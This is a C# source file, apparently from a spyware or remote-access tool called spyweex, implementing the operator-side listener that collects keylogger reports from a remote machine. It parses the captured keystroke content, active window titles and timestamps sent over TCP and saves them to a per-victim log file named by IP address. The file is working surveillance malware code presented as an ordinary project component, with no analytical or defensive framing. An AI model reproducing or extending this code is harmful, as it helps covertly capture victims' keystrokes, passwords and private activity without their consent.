using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Windows;
using System.Xml.Linq;
using System.Xml.XPath;

namespace spyweex_client_wpf.Subscribers
{
    public class KeyloggerListener : ISubscriber
    {
        public void Subscribe(WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.CurrentThread).
                SkipWhile(
                response => response.Action.Equals(StaticStrings.ACTION_TYPE.KEYLOGGER_REPORT) &&
                response.Action.Equals(StaticStrings.ACTION_TYPE.KEYLOGGER_STOP)).
                Subscribe(
                response =>
                {
                    Encoding enc = Encoding.GetEncoding("utf-8");
                    string data = enc.GetString(response.content);

                    var jsonReader = JsonReaderWriterFactory.CreateJsonReader(
                        Encoding.Default.GetBytes(data), new System.Xml.XmlDictionaryReaderQuotas());
                    var root = XElement.Load(jsonReader);

                    List<string> lines_to_be_inserted_into_file = new List<string>();

                    try
                    {
                        string start_time = root.XPathSelectElement("start_time").Value;
                        lines_to_be_inserted_into_file.Add("--------------START TIME--------------");
                        lines_to_be_inserted_into_file.Add(start_time);
                    }
                    catch (Exception ex) { }

                    try
                    {
                        string end_time = root.XPathSelectElement("end_time").Value;
                        lines_to_be_inserted_into_file.Add("---------------END TIME---------------");
                        lines_to_be_inserted_into_file.Add(end_time);
                    }
                    catch(Exception ex) { }

                    try
                    {
                        string active_window = root.XPathSelectElement("active_window").Value;
                        lines_to_be_inserted_into_file.Add("----------LAST ACTIVE WINDOW----------");
                        lines_to_be_inserted_into_file.Add(active_window);
                    }
                    catch(Exception ex) { }

                    try
                    {
                        string content = root.XPathSelectElement("content").Value;
                        lines_to_be_inserted_into_file.Add("----------------CONTENT----------------");
                        lines_to_be_inserted_into_file.Add(content);
                    }
                    catch (Exception ex) { }

                    string path = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString().Split(
                        new string[] {":"}, StringSplitOptions.RemoveEmptyEntries)[0] + "_keylogs.txt";
                    System.IO.File.AppendAllLines(@path, lines_to_be_inserted_into_file);
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in ConnectionInfoListener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;
        }
    }
}